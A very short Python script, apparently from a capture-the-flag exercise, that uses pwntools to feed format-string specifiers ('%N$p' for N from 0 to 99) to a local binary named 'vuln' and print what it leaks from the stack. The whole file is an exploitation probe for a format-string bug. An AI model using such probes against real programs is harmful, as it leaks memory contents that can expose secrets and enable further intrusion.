from pwn import *

for i in range(100):
    p = process("./vuln")
    p.sendline("%{}$p".format(i))
    print(p.recv(),1)
    p.close()
    
